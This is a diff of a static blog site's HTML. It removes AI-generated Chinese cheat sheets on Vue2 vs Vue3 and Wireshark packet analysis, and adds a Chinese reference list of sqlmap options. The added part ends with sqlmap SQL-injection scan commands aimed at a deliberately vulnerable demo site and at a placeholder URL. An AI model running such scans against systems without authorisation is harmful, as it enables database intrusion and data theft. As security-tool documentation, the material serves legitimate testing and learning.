-<td>改串行处理,for 循环 await</td>
-</tr>
-<tr>
-<td>断点续传后进度归零</td>
-<td>检查是否用字节累加而非分片计数</td>
-</tr>
-<tr>
-<td>秒传不生效</td>
-<td>确认 fileMd5 是否在 await 后才赋值</td>
-</tr>
-<tr>
-<td>同名文件无法添加</td>
-<td>去重逻辑改用 MD5 而非文件名</td>
-</tr>
-<tr>
-<td>取消一个文件全停</td>
-<td>每个 fileblock 独立 cancel 令牌</td>
-</tr>
-<tr>
-<td>获取视频时长很慢</td>
-<td>用 loadedmetadata 不用 canplaythrough</td>
-</tr>
-<tr>
-<td>切片时内存暴涨</td>
-<td>确认用 Blob.slice 而非 FileReader 全读</td>
-</tr>
-</tbody></table>
-<hr>
-<p><em>by claude-sonnet-5 nightly expand · 2026-09-25</em></p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来设置一些一般的工作参数。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--flush-session 刷新当前目标的会话文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--fresh-queries 忽略在会话文件中存储的查询结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--eta 显示每个输出的预计到达时间
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--update 更新SqlMap
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--save file保存选项到INI配置文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--batch 从不询问用户输入，使用所有默认配置。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Miscellaneous（杂项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--beep 发现SQL注入时提醒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--check-payload IDS对注入payloads的检测测试
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cleanup SqlMap具体的UDF和表清理DBMS
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--forms 对目标URL的解析和测试形式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--page-rank Google dork结果显示网页排名（PR）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--parse-errors 从响应页面解析数据库管理系统的错误消息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--replicate 复制转储的数据到一个sqlite3数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--wizard 给初级用户的简单向导界面
+	</li>
+</ul>
+
+<p>
+	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
+</p>
+<p>
+	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
+</p>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
 
         </div>
     
@@ -502,500 +924,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/2026-09-25-expanded-blog-vue2-%E5%AF%B9%E6%AF%94-vue3/">
-                [expanded] [blog] vue2 对比 vue3
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-25</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="expanded-blog-vue2-对比-vue3"><a href="#expanded-blog-vue2-对比-vue3" class="headerlink" title="[expanded] [blog] vue2 对比 vue3"></a>[expanded] [blog] vue2 对比 vue3</h1><blockquote>
-<p>原始问题: [blog] vue2 对比 vue3</p>
-</blockquote>
-<h1 id="Vue2-vs-Vue3-核心差异速查"><a href="#Vue2-vs-Vue3-核心差异速查" class="headerlink" title="Vue2 vs Vue3 核心差异速查"></a>Vue2 vs Vue3 核心差异速查</h1><blockquote>
-<p>场景占位: 组件用 <ComponentA>、<ComponentB>,数据用 <dataKey>、<propName><br>阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手</p>
-</blockquote>
-<hr>
-<h2 id="1-生命周期钩子在-Vue3-需显式导入且改名"><a href="#1-生命周期钩子在-Vue3-需显式导入且改名" class="headerlink" title="1. 生命周期钩子在 Vue3 需显式导入且改名"></a>1. 生命周期钩子在 Vue3 需显式导入且改名</h2><ul>
-<li><strong>规则</strong>: Vue3 中 <code>beforeDestroy</code> 改为 <code>onBeforeUnmount</code>,<code>destroyed</code> 改为 <code>onUnmounted</code>,且需从 <code>vue</code> 包导入</li>
-<li><strong>为什么</strong>: Vue3 Composition API 设计哲学要求显式依赖,避免全局魔法变量;销毁语义改为”卸载”更准确</li>
-<li><strong>踩坑</strong>: 直接在 <code>setup()</code> 里写 <code>beforeDestroy()</code> 不会报错但永远不执行,因为 Vue3 根本不认这个名字</li>
-<li><strong>例外</strong>: Options API 模式下仍可用旧名称,但不推荐混用</li>
-</ul>
-<h2 id="2-setup-函数替代-beforeCreate-和-created"><a href="#2-setup-函数替代-beforeCreate-和-created" class="headerlink" title="2. setup 函数替代 beforeCreate 和 created"></a>2. setup 函数替代 beforeCreate 和 created</h2><ul>
-<li><strong>规则</strong>: Vue3 的 <code>setup()</code> 在组件实例创建前执行,无需再写 <code>beforeCreate</code> 和 <code>created</code></li>
-<li><strong>为什么</strong>: <code>setup()</code> 执行时机就在这两个钩子之间,重复定义会造成逻辑分散和 <code>this</code> 指向混乱</li>
-<li><strong>踩坑</strong>: 在 <code>setup()</code> 里访问 <code>this</code> 是 <code>undefined</code>,因为组件实例还未创建完成</li>
-</ul>
-<h2 id="3-父子通信在-Vue3-需用-defineProps-和-defineEmits"><a href="#3-父子通信在-Vue3-需用-defineProps-和-defineEmits" class="headerlink" title="3. 父子通信在 Vue3 需用 defineProps 和 defineEmits"></a>3. 父子通信在 Vue3 需用 defineProps 和 defineEmits</h2><ul>
-<li><strong>规则</strong>: Vue3 script setup 中用编译宏 <code>defineProps</code> 接收父组件数据,用 <code>defineEmits</code> 定义向父发送的事件</li>
-<li><strong>为什么</strong>: 编译时宏可做静态分析和类型推导,比 Vue2 运行时 <code>props</code> 选项更高效且 TypeScript 友好</li>
-<li><strong>踩坑</strong>: <code>defineProps</code> 不需要 import 就能用,手动导入反而报错,因为它是编译器注入的</li>
-<li><strong>例外</strong>: Options API 模式仍用 <code>props</code> 和 <code>$emit</code></li>
-</ul>
-<h2 id="4-ref-在-Vue3-有双重含义需区分场景"><a href="#4-ref-在-Vue3-有双重含义需区分场景" class="headerlink" title="4. ref 在 Vue3 有双重含义需区分场景"></a>4. ref 在 Vue3 有双重含义需区分场景</h2><ul>
-<li><strong>规则</strong>: 模板中 <code>ref=&quot;&lt;refName&gt;&quot;</code> 仍用于获取 DOM&#x2F;组件实例,但 <code>&lt;script&gt;</code> 中 <code>ref()</code> 是响应式数据包装器</li>
-<li><strong>为什么</strong>: Vue3 用 <code>ref()</code> 统一基本类型响应式,模板 ref 通过同名变量自动绑定,两者命名空间独立</li>
-<li><strong>踩坑</strong>: 在 <code>setup()</code> 中访问 ref 包装的值必须 <code>.value</code>,但模板中自动解包不需要</li>
-<li><strong>例外</strong>: <code>reactive()</code> 包装的对象不需要 <code>.value</code></li>
-</ul>
-<h2 id="5-渲染-Watcher-在-Vue3-改为-effect-副作用系统"><a href="#5-渲染-Watcher-在-Vue3-改为-effect-副作用系统" class="headerlink" title="5. 渲染 Watcher 在 Vue3 改为 effect 副作用系统"></a>5. 渲染 Watcher 在 Vue3 改为 effect 副作用系统</h2><ul>
-<li><strong>规则</strong>: Vue2 的 <code>Watcher</code> 类在 Vue3 被 <code>ReactiveEffect</code> 替代,初始化渲染不再显式创建 watcher 实例</li>
-<li><strong>为什么</strong>: Vue3 响应式系统基于 Proxy 重写,effect 追踪更细粒度,性能提升 1.3-2 倍</li>
-<li><strong>踩坑</strong>: Vue2 可以手动 <code>new Watcher()</code>,Vue3 必须通过 <code>watchEffect</code> 或 <code>watch</code> API,直接操作内部 effect 会破坏依赖追踪</li>
-</ul>
-<h2 id="6-data-选项在-Vue3-必须是函数不能是对象"><a href="#6-data-选项在-Vue3-必须是函数不能是对象" class="headerlink" title="6. data 选项在 Vue3 必须是函数不能是对象"></a>6. data 选项在 Vue3 必须是函数不能是对象</h2><ul>
-<li><strong>规则</strong>: Vue3 彻底移除 <code>data</code> 对象写法,只接受返回对象的函数</li>
-<li><strong>为什么</strong>: 防止多个组件实例共享同一数据对象,虽然 Vue2 也推荐函数但仍允许对象(根实例除外)</li>
-<li><strong>踩坑</strong>: 迁移时全局搜索 <code>data: &#123;</code> 会漏掉根实例,因为 Vue2 根实例允许对象</li>
-<li><strong>例外</strong>: Composition API 中直接用 <code>ref</code>&#x2F;<code>reactive</code> 无此限制</li>
-</ul>
-<h2 id="7-watch-在-Vue3-需显式指定深度监听且返回值不同"><a href="#7-watch-在-Vue3-需显式指定深度监听且返回值不同" class="headerlink" title="7. watch 在 Vue3 需显式指定深度监听且返回值不同"></a>7. watch 在 Vue3 需显式指定深度监听且返回值不同</h2><ul>
-<li><strong>规则</strong>: Vue3 <code>watch</code> 默认浅监听,监听对象需配置 <code>&#123; deep: true &#125;</code>,且返回停止函数而非 Vue2 的 unwatch</li>
-<li><strong>为什么</strong>: 默认浅监听避免大对象性能陷阱,返回函数符合现代 JS 清理模式(类似 <code>useEffect</code>)</li>
-<li><strong>踩坑</strong>: Vue2 <code>this.$watch</code> 返回的 unwatch 函数在 Vue3 中仍叫 unwatch 但实现完全不同,不可混用</li>
-</ul>
-<h2 id="8-组件注册在-Vue3-局部注册优先于全局"><a href="#8-组件注册在-Vue3-局部注册优先于全局" class="headerlink" title="8. 组件注册在 Vue3 局部注册优先于全局"></a>8. 组件注册在 Vue3 局部注册优先于全局</h2><ul>
-<li><strong>规则</strong>: Vue3 推荐在 <code>&lt;script setup&gt;</code> 中直接 import 组件即自动注册,全局 <code>app.component()</code> 仅用于基础组件</li>
-<li><strong>为什么</strong>: Tree-shaking 友好,未使用的组件不会打包;Vue2 的 <code>components</code> 选项仍可用但不推荐</li>
-<li><strong>踩坑</strong>: <code>&lt;script setup&gt;</code> 中 import 的组件名必须是 PascalCase,kebab-case 在模板中自动转换但变量名不行</li>
-</ul>
-<h2 id="9-mount-在-Vue3-改为-app-mount-且不可链式调用"><a href="#9-mount-在-Vue3-改为-app-mount-且不可链式调用" class="headerlink" title="9. $mount 在 Vue3 改为 app.mount 且不可链式调用"></a>9. $mount 在 Vue3 改为 app.mount 且不可链式调用</h2><ul>
-<li><strong>规则</strong>: Vue3 用 <code>createApp(&lt;Component&gt;).mount(&lt;selector&gt;)</code> 替代 <code>new Vue().$mount()</code>,mount 返回根组件实例而非 app</li>
-<li><strong>为什么</strong>: 应用实例(app)和组件实例分离,一个页面可创建多个独立 Vue 应用互不干扰</li>
-<li><strong>踩坑</strong>: <code>app.mount()</code> 只能调用一次,Vue2 可以先 <code>new Vue()</code> 后多次 <code>$mount</code> 到不同元素</li>
-</ul>
-<h2 id="10-methods-在-Composition-API-中退化为普通函数"><a href="#10-methods-在-Composition-API-中退化为普通函数" class="headerlink" title="10. methods 在 Composition API 中退化为普通函数"></a>10. methods 在 Composition API 中退化为普通函数</h2><ul>
-<li><strong>规则</strong>: <code>&lt;script setup&gt;</code> 中直接定义函数即可在模板使用,无需 <code>methods</code> 选项包裹</li>
-<li><strong>为什么</strong>: <code>methods</code> 本质是为了绑定 <code>this</code>,Composition API 无 <code>this</code> 概念,普通函数更直观</li>
-<li><strong>踩坑</strong>: 普通函数没有自动 <code>this</code> 绑定,需要的状态必须显式从 <code>setup</code> 作用域捕获</li>
-</ul>
-<h2 id="11-动态组件-component-标签的-is-属性需用-v-bind"><a href="#11-动态组件-component-标签的-is-属性需用-v-bind" class="headerlink" title="11. 动态组件 component 标签的 is 属性需用 v-bind"></a>11. 动态组件 component 标签的 is 属性需用 v-bind</h2><ul>
-<li><strong>规则</strong>: Vue3 中 <code>&lt;component is=&quot;&lt;ComponentName&gt;&quot;&gt;</code> 必须写成 <code>:is=&quot;&lt;ComponentName&gt;&quot;</code>,字符串形式仅用于原生 HTML 标签</li>
-<li><strong>为什么</strong>: 区分组件对象和 HTML 标签字符串,避免安全风险(Vue2 会尝试解析字符串为组件)</li>
-<li><strong>踩坑</strong>: 迁移时 <code>is=&quot;ComponentA&quot;</code> 会被渲染为自定义元素而非组件,必须改为 <code>:is=&quot;ComponentA&quot;</code></li>
-</ul>
-<h2 id="12-响应式丢失在解构-props-时必须用-toRefs"><a href="#12-响应式丢失在解构-props-时必须用-toRefs" class="headerlink" title="12. 响应式丢失在解构 props 时必须用 toRefs"></a>12. 响应式丢失在解构 props 时必须用 toRefs</h2><ul>
-<li><strong>规则</strong>: <code>const &#123; &lt;propName&gt; &#125; = defineProps()</code> 会丢失响应式,需 <code>const &#123; &lt;propName&gt; &#125; = toRefs(props)</code></li>
-<li><strong>为什么</strong>: 解构是值拷贝,切断了 Proxy 代理链;<code>toRefs</code> 为每个属性创建独立 ref 保持响应</li>
-<li><strong>踩坑</strong>: 模板中直接用 props 正常,但解构后传给 <code>computed</code> 或 <code>watch</code> 会失效</li>
-</ul>
-<hr>
-<h2 id="🔥-5-秒必记-5-条"><a href="#🔥-5-秒必记-5-条" class="headerlink" title="🔥 5 秒必记 5 条"></a>🔥 5 秒必记 5 条</h2><ol>
-<li><strong>setup 替代 beforeCreate&#x2F;created,内部无 this</strong></li>
-<li><strong>生命周期钩子改名且需导入: onBeforeUnmount&#x2F;onUnmounted</strong></li>
-<li><strong>ref() 的值在 script 中要 .value,模板中自动解包</strong></li>
-<li><strong>defineProps&#x2F;defineEmits 是编译宏,不需要 import</strong></li>
-<li><strong>解构 props 必须 toRefs 否则丢失响应式</strong></li>
-</ol>
-<h2 id="决策速查-遇到-X-想-Y"><a href="#决策速查-遇到-X-想-Y" class="headerlink" title="决策速查(遇到 X 想 Y)"></a>决策速查(遇到 X 想 Y)</h2><table>
-<thead>
-<tr>
-<th>遇到</th>
-<th>想</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>需要在组件创建时初始化数据</td>
-<td>直接写在 setup() 顶层,不用 created</td>
-</tr>
-<tr>
-<td>父组件传值给子组件</td>
-<td>Vue3 用 defineProps,Vue2 用 props 选项</td>
-</tr>
-<tr>
-<td>子组件通知父组件</td>
-<td>Vue3 用 defineEmits + emit,Vue2 用 $emit</td>
-</tr>
-<tr>
-<td>获取子组件实例</td>
-<td>模板 ref&#x3D;”<name>“ 后 setup 中同名 ref 变量自动绑定</td>
-</tr>
-<tr>
-<td>监听对象内部变化</td>
-<td>watch 第三参数加 { deep: true }</td>
-</tr>
-<tr>
-<td>组件销毁前清理</td>
-<td>onBeforeUnmount 替代 beforeDestroy</td>
-</tr>
-<tr>
-<td>动态切换组件</td>
-<td><code>&lt;component :is=&quot;变量&quot;&gt;</code> 必须用冒号绑定</td>
-</tr>
-<tr>
-<td>响应式数据解构</td>
-<td>toRefs(props) 或 toRefs(reactive对象)</td>
-</tr>
-</tbody></table>
-<hr>
-<p><em>by claude-sonnet-5 nightly expand · 2026-09-25</em></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/25/2026-09-25-expanded-blog-wireshark/">
-                [expanded] [blog] Wireshark
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-25</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="expanded-blog-Wireshark"><a href="#expanded-blog-Wireshark" class="headerlink" title="[expanded] [blog] Wireshark"></a>[expanded] [blog] Wireshark</h1><blockquote>
-<p>原始问题: [blog] Wireshark</p>
-</blockquote>
-<h1 id="Wireshark-网络抓包分析技能清单"><a href="#Wireshark-网络抓包分析技能清单" class="headerlink" title="Wireshark 网络抓包分析技能清单"></a>Wireshark 网络抓包分析技能清单</h1><blockquote>
-<p>场景占位: 用 <LOCAL_IP> 表示本机地址, <REMOTE_IP> 表示远端地址, <SERVICE_PORT> 表示服务端口<br>阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手</p>
-</blockquote>
-<hr>
-<h2 id="1-过滤器写在捕获前还是捕获后决定性能和完整性"><a href="#1-过滤器写在捕获前还是捕获后决定性能和完整性" class="headerlink" title="1. 过滤器写在捕获前还是捕获后决定性能和完整性"></a>1. 过滤器写在捕获前还是捕获后决定性能和完整性</h2><ul>
-<li><strong>规则</strong>: 捕获过滤器(Capture Filter)丢弃不符合条件的包且不可恢复,显示过滤器(Display Filter)仅隐藏但数据仍在</li>
-<li><strong>为什么</strong>: 捕获过滤器用 BPF 语法在内核层丢包,显示过滤器用 Wireshark 语法在应用层过滤,90% 的人混用导致抓不到关键包或文件过大</li>
-<li><strong>踩坑</strong>: 生产环境用捕获过滤器 <code>host &lt;REMOTE_IP&gt;</code> 后发现漏抓了中间代理的包,因为真实通信经过 <PROXY_IP></li>
-<li><strong>例外</strong>: 排查未知问题时先全量捕获再用显示过滤器,避免过早丢弃线索</li>
-</ul>
-<h2 id="2-ip-addr-是双向匹配会抓到意料外的流量"><a href="#2-ip-addr-是双向匹配会抓到意料外的流量" class="headerlink" title="2. ip.addr 是双向匹配会抓到意料外的流量"></a>2. ip.addr 是双向匹配会抓到意料外的流量</h2><ul>
-<li><strong>规则</strong>: <code>ip.addr == &lt;TARGET_IP&gt;</code> 匹配源地址或目的地址,需要单向过滤必须用 <code>ip.src</code> 或 <code>ip.dst</code></li>
-<li><strong>为什么</strong>: 大部分协议是双向的,用 ip.addr 会同时抓到请求和响应,导致包数量翻倍且难以区分主动连接方</li>
-<li><strong>踩坑</strong>: 想抓客户端主动发起的连接用了 <code>ip.addr == &lt;CLIENT_IP&gt;</code>,结果把服务端响应也抓进来,误判为客户端发包频率异常</li>
-<li><strong>例外</strong>: 分析完整会话时 ip.addr 更方便,配合 <code>tcp.stream eq &lt;N&gt;</code> 追踪单条流</li>
-</ul>
-<h2 id="3-包编号-No-在过滤后不连续是正常的"><a href="#3-包编号-No-在过滤后不连续是正常的" class="headerlink" title="3. 包编号(No.)在过滤后不连续是正常的"></a>3. 包编号(No.)在过滤后不连续是正常的</h2><ul>
-<li><strong>规则</strong>: Wireshark 的 No. 列是捕获时的全局序号,应用显示过滤器后编号会跳跃但不会重新编号</li>
-<li><strong>为什么</strong>: 编号对应 pcap 文件中的物理位置,重新编号会导致无法与原始文件对应,这是设计而非 bug</li>
-<li><strong>踩坑</strong>: 过滤后看到 No. 从 1234 跳到 5678,以为中间的包丢失了,实际是被过滤条件隐藏</li>
-<li><strong>例外</strong>: 导出过滤后的包为新文件时,新文件会重新从 1 开始编号</li>
-</ul>
-<h2 id="4-TCP-三次握手的-Seq-不是从-0-开始是安全机制"><a href="#4-TCP-三次握手的-Seq-不是从-0-开始是安全机制" class="headerlink" title="4. TCP 三次握手的 Seq 不是从 0 开始是安全机制"></a>4. TCP 三次握手的 Seq 不是从 0 开始是安全机制</h2><ul>
-<li><strong>规则</strong>: SYN 包的 Seq 是随机初始序列号(ISN),Wireshark 默认显示相对序列号(从 0 开始),需要看真实值要关闭 “Relative sequence numbers”</li>
-<li><strong>为什么</strong>: 随机 ISN 防止序列号预测攻击,相对序列号是 Wireshark 为了方便人类阅读做的转换</li>
-<li><strong>踩坑</strong>: 对比两端抓包时发现 Seq 不一致,因为一端开了相对序列号显示,另一端显示的是绝对值</li>
-<li><strong>例外</strong>: 分析 TCP 劫持或序列号预测攻击时必须看绝对序列号</li>
-</ul>
-<h2 id="5-Len-0-的包不是空包而是控制包"><a href="#5-Len-0-的包不是空包而是控制包" class="headerlink" title="5. Len&#x3D;0 的包不是空包而是控制包"></a>5. Len&#x3D;0 的包不是空包而是控制包</h2><ul>
-<li><strong>规则</strong>: TCP 包的 Len 字段表示有效载荷长度,SYN&#x2F;ACK&#x2F;FIN 等控制包 Len&#x3D;0 但仍然消耗序列号</li>
-<li><strong>为什么</strong>: TCP 头部的控制标志位(SYN&#x2F;FIN)本身占用 1 个序列号,但不计入 Len,这是协议设计</li>
-<li><strong>踩坑</strong>: 看到大量 Len&#x3D;0 的包以为网络空转,实际是正常的 keepalive 或连接管理</li>
-<li><strong>例外</strong>: ACK 纯确认包既不消耗序列号也 Len&#x3D;0,但会推进确认号(Ack)</li>
-</ul>
-<h2 id="6-时间戳格式影响问题定位效率"><a href="#6-时间戳格式影响问题定位效率" class="headerlink" title="6. 时间戳格式影响问题定位效率"></a>6. 时间戳格式影响问题定位效率</h2><ul>
-<li><strong>规则</strong>: 默认时间戳是相对第一个包的偏移量,排查超时问题改用 “Time of Day” 格式对照日志</li>
-<li><strong>为什么</strong>: 相对时间适合看包间隔,绝对时间适合与应用日志、数据库慢查询日志对齐</li>
-<li><strong>踩坑</strong>: 应用日志显示 14:32:15 超时,但 Wireshark 显示 +125.334s 无法快速定位到对应的包</li>
-<li><strong>例外</strong>: 分析重传间隔、RTT 时相对时间更直观</li>
-</ul>
-<h2 id="7-同一个-TCP-流的包可能分散在文件各处"><a href="#7-同一个-TCP-流的包可能分散在文件各处" class="headerlink" title="7. 同一个 TCP 流的包可能分散在文件各处"></a>7. 同一个 TCP 流的包可能分散在文件各处</h2><ul>
-<li><strong>规则</strong>: 使用 “Follow TCP Stream” 或过滤 <code>tcp.stream eq &lt;N&gt;</code> 聚合同一条连接的所有包</li>
-<li><strong>为什么</strong>: Wireshark 按时间顺序捕获所有网卡流量,多条并发连接的包会交错出现</li>
-<li><strong>踩坑</strong>: 手动用 <code>ip.addr and tcp.port</code> 过滤后仍看到多条连接混在一起,因为客户端用了不同的源端口</li>
-<li><strong>例外</strong>: UDP 没有流的概念,需要用 <code>ip.addr and udp.port</code> 手动组合过滤</li>
-</ul>
-<h2 id="8-抓包文件过大时先用-editcap-切割再分析"><a href="#8-抓包文件过大时先用-editcap-切割再分析" class="headerlink" title="8. 抓包文件过大时先用 editcap 切割再分析"></a>8. 抓包文件过大时先用 editcap 切割再分析</h2><ul>
-<li><strong>规则</strong>: 超过 500MB 的 pcap 文件会导致 Wireshark 卡顿,用 <code>editcap -c &lt;包数&gt; &lt;输入&gt; &lt;输出前缀&gt;</code> 按包数切割</li>
-<li><strong>为什么</strong>: Wireshark 会将整个文件加载到内存建索引,大文件会耗尽内存或导致 GUI 无响应</li>
-<li><strong>踩坑</strong>: 直接打开 5GB 的抓包文件,Wireshark 卡死 10 分钟后系统 OOM</li>
-<li><strong>例外</strong>: 只需要统计信息时用 <code>capinfos</code> 或 <code>tshark -q -z</code> 无需加载完整文件</li>
-</ul>
-<h2 id="9-显示过滤器支持逻辑运算但优先级反直觉"><a href="#9-显示过滤器支持逻辑运算但优先级反直觉" class="headerlink" title="9. 显示过滤器支持逻辑运算但优先级反直觉"></a>9. 显示过滤器支持逻辑运算但优先级反直觉</h2><ul>
-<li><strong>规则</strong>: <code>and</code> 优先级高于 <code>or</code>,复杂条件必须加括号,如 <code>(ip.src == &lt;IP_A&gt; or ip.src == &lt;IP_B&gt;) and tcp.port == &lt;PORT&gt;</code></li>
-<li><strong>为什么</strong>: 不加括号时 <code>ip.src == &lt;IP_A&gt; or ip.src == &lt;IP_B&gt; and tcp.port == &lt;PORT&gt;</code> 会被解析为 <code>ip.src == &lt;IP_A&gt; or (ip.src == &lt;IP_B&gt; and tcp.port == &lt;PORT&gt;)</code></li>
-<li><strong>踩坑</strong>: 想过滤两个 IP 的 80 端口流量,写成 <code>ip.addr == &lt;IP_A&gt; or ip.addr == &lt;IP_B&gt; and tcp.port == 80</code>,结果把 <IP_A> 的所有端口都抓进来了</li>
-<li><strong>例外</strong>: 单一条件无需考虑优先级</li>
-</ul>
-<h2 id="10-重传包-Retransmission-出现不一定是网络问题"><a href="#10-重传包-Retransmission-出现不一定是网络问题" class="headerlink" title="10. 重传包(Retransmission)出现不一定是网络问题"></a>10. 重传包(Retransmission)出现不一定是网络问题</h2><ul>
-<li><strong>规则</strong>: TCP 重传可能由接收窗口满、应用层处理慢导致,需结合 “TCP Window Full” 和 “TCP ZeroWindow” 分析</li>
-<li><strong>为什么</strong>: 网络丢包和接收端来不及处理都会导致重传,但根因不同,前者查网络设备,后者查应用性能</li>
-<li><strong>踩坑</strong>: 看到大量 Retransmission 就升级带宽,实际是数据库查询慢导致应用接收缓冲区满</li>
-<li><strong>例外</strong>: 无线网络环境下少量重传(&lt; 1%)是正常的</li>
-</ul>
-<h2 id="11-Expert-Info-的-Warning-不等于故障"><a href="#11-Expert-Info-的-Warning-不等于故障" class="headerlink" title="11. Expert Info 的 Warning 不等于故障"></a>11. Expert Info 的 Warning 不等于故障</h2><ul>
-<li><strong>规则</strong>: Expert Info 中的 “TCP Previous segment not captured” 可能是抓包点不完整,不一定是真丢包</li>
-<li><strong>为什么</strong>: 在客户端抓包时看不到服务端发出但未到达的包,在中间设备抓包时可能因端口镜像丢包</li>
-<li><strong>踩坑</strong>: 在负载均衡器后的服务器抓包,看到大量 “Previous segment not captured”,实际是流量分散到其他服务器了</li>
-<li><strong>例外</strong>: 在发送端抓包仍出现此告警,大概率是真丢包</li>
-</ul>
-<h2 id="12-解密-HTTPS-流量需要提前配置不能事后补救"><a href="#12-解密-HTTPS-流量需要提前配置不能事后补救" class="headerlink" title="12. 解密 HTTPS 流量需要提前配置不能事后补救"></a>12. 解密 HTTPS 流量需要提前配置不能事后补救</h2><ul>
-<li><strong>规则</strong>: 必须在抓包前设置环境变量 <code>SSLKEYLOGFILE=&lt;路径&gt;</code> 让应用记录会话密钥,或导入服务器私钥(仅 RSA 且无前向保密)</li>
-<li><strong>为什么</strong>: TLS 1.3 和使用 ECDHE 的 TLS 1.2 有完美前向保密,抓包后无法通过私钥解密</li>
-<li><strong>踩坑</strong>: 抓完包才想起来要解密 HTTPS,即使有服务器私钥也解不开,因为用了 ECDHE 密钥交换</li>
-<li><strong>例外</strong>: 中间人代理(如 mitmproxy)可以实时解密,但会改变证书链</li>
-</ul>
-<h2 id="13-协议解析错误时手动指定-“Decode-As”"><a href="#13-协议解析错误时手动指定-“Decode-As”" class="headerlink" title="13. 协议解析错误时手动指定 “Decode As”"></a>13. 协议解析错误时手动指定 “Decode As”</h2><ul>
-<li><strong>规则</strong>: 非标准端口的协议(如 8080 跑 HTTP)需要右键包选择 “Decode As” 指定协议类型</li>
-<li><strong>为什么</strong>: Wireshark 默认靠端口号判断协议,自定义端口会被识别为 TCP 原始数据</li>
-<li><strong>踩坑</strong>: 抓到 <SERVICE_PORT> 的流量显示为乱码,实际是 HTTP 协议但 Wireshark 不认识</li>
-<li><strong>例外</strong>: 部分协议有特征字节(如 HTTP 的 “GET”),Wireshark 会启发式识别</li>
-</ul>
-<h2 id="14-导出对象功能只对完整流有效"><a href="#14-导出对象功能只对完整流有效" class="headerlink" title="14. 导出对象功能只对完整流有效"></a>14. 导出对象功能只对完整流有效</h2><ul>
-<li><strong>规则</strong>: “File -&gt; Export Objects -&gt; HTTP” 导出文件时,如果 TCP 流不完整(缺 SYN 或 FIN)会导出失败</li>
-<li><strong>为什么</strong>: Wireshark 需要完整的 HTTP 请求响应对才能重组文件,中途开始抓包会缺少流的起始部分</li>
-<li><strong>踩坑</strong>: 抓包过程中才打开 Wireshark,想导出传输的文件时发现列表为空</li>
-<li><strong>例外</strong>: 使用 “Follow TCP Stream” 手动复制 payload 可以绕过此限制</li>
-</ul>
-<h2 id="15-统计功能比逐包分析更快定位瓶颈"><a href="#15-统计功能比逐包分析更快定位瓶颈" class="headerlink" title="15. 统计功能比逐包分析更快定位瓶颈"></a>15. 统计功能比逐包分析更快定位瓶颈</h2><ul>
-<li><strong>规则</strong>: 用 “Statistics -&gt; Conversations” 找出流量最大的连接,”Statistics -&gt; IO Graph” 看流量趋势</li>
-<li><strong>为什么</strong>: 逐包分析 10 万个包需要数小时,统计视图 10 秒内就能发现异常连接或流量突刺</li>
-<li><strong>踩坑</strong>: 网络慢但不知道哪个服务占带宽,逐个过滤 IP 查了半天,用 Conversations 按 Bytes 排序 5 秒找到</li>
-<li><strong>例外</strong>: 分析协议细节(如异常标志位)时仍需逐包检查</li>
-</ul>
-<hr>
-<h2 id="🔥-5-秒必记-5-条"><a href="#🔥-5-秒必记-5-条" class="headerlink" title="🔥 5 秒必记 5 条"></a>🔥 5 秒必记 5 条</h2><ol>
-<li><strong>捕获过滤器丢包不可恢复,显示过滤器仅隐藏,排查未知问题先全抓</strong></li>
-<li><strong>ip.addr 是双向匹配,单向过滤必须用 ip.src&#x2F;dst</strong></li>
-<li><strong>重传包需结合 Window Full 判断是网络丢包还是接收端慢</strong></li>
-<li><strong>解密 HTTPS 必须抓包前配置 SSLKEYLOGFILE,事后无法补救</strong></li>
